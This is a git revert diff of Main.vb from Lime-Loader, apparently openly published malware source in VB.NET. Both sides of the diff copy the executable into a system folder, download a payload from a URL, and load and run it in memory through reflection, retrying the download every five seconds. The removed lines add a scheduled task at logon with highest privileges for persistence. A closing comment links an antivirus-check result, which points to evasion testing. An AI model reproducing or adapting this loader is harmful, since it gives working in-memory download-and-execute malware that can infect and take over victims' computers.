51042ce1836de72aaf6b07ca00d8d74f2b7cdd7c
NYAN-x-CAT <NYANxCAT@pm.me>
2018-11-23 02:44:39 +0300

    Revert "Update Main.vb"
    This reverts commit b83353588f8e97edaed20910c256e254a3b30fbc.

--- Lime-Loader/Main.vb
+++ Lime-Loader/Main.vb
@@ -1,46 +1,54 @@
-'https://github.com/NYAN-x-CAT/Lime-Loader
+﻿'https://github.com/NYAN-x-CAT/Lime-Loader
 
-Public Class Main
+Public Class Program
+
 
     Public Shared Sub Main()
-        Install("26", "Loader.exe")
-        Invoke("http://127.0.0.1:80/Payload.exe")
-        'Invoke(My.Resources.Payload) -> need algorithm
+        Installer("26", "Loader.exe")
+        Load("http://127.0.0.1:80/Payload.exe")
     End Sub
 
-    Public Shared Sub Install(ByVal Path As String, ByVal Name As String)
-        On Error Resume Next
-        If Application.ExecutablePath <> IO.Path.Combine(Environment.GetFolderPath(Path), Name) Then
-            IO.File.Copy(Application.ExecutablePath, IO.Path.Combine(Environment.GetFolderPath(Path), Name), True)
-            Shell("schtasks /create /f /sc onlogon /RL highest /tn " + IO.Path.GetFileName(Application.ExecutablePath) + " /tr " + """'" + IO.Path.Combine(Environment.GetFolderPath(Path), Name) + "'""")
+    Private Shared Sub Load(ByVal Loader As String)
+
+        Dim Assembly As Reflection.Assembly = Threading.Thread.GetDomain.Load(Download(Loader))
+        Dim Entrypoint As Reflection.MethodInfo = Assembly.EntryPoint
+
+        If Entrypoint.GetParameters().Length > 0 Then
+            Entrypoint.Invoke(Nothing, New Object() {Nothing})
+        Else
+            Entrypoint.Invoke(Nothing, Nothing)
+        End If
+
+    End Sub
+
+    Private Shared Sub Installer(ByVal Path As String, ByVal Name As String)
+        If Diagnostics.Process.GetCurrentProcess.MainModule.FileName <> IO.Path.Combine(Environment.GetFolderPath(Path), Name) Then
+
+            Try
+                IO.File.Copy(Diagnostics.Process.GetCurrentProcess.MainModule.FileName, IO.Path.Combine(Environment.GetFolderPath(Path), Name), True)
+            Catch ex As Exception
+            End Try
+
         End If
     End Sub
 
-    Public Shared Sub Invoke(ByVal URL As String)
-        Dim Load As Object = CallByName(AppDomain.CurrentDomain, "load", CallType.Method, Download(URL))
-        Dim EntryPoint As Object = CallByName(Load, "EntryPoint", CallType.Get)
-        Try
-            Dim Invoke As Object = CallByName(EntryPoint, "Invoke", CallType.Method, Nothing, Nothing)
-        Catch ex As Exception
-            Dim Invoke As Object = CallByName(EntryPoint, "Invoke", CallType.Method, Nothing, New Object() {Nothing})
-        End Try
+    Private Shared Function Download(ByVal URL As String) As Byte()
+        Using WC As New Net.WebClient
 
-    End Sub
-
-    Public Shared Function Download(ByVal URL As String)
+            Try
 re:
-        Dim EXE As Byte() = Nothing
-        Try
-            Dim WC As New Net.WebClient
-            EXE = WC.DownloadData(URL)
-            WC.Dispose()
-        Catch ex As Exception
-            Threading.Thread.Sleep(5000)
-            GoTo re
-        End Try
-        Return EXE
+                Dim B As Byte() = WC.DownloadData(URL)
+                WC.Dispose()
+                Return B
+            Catch ex As Exception
+                Threading.Thread.Sleep(5000)
+                GoTo re
+            End Try
+
+        End Using
     End Function
 
 End Class
+
 
 'http://avcheck.net/id/mTYMhMvaPa6c
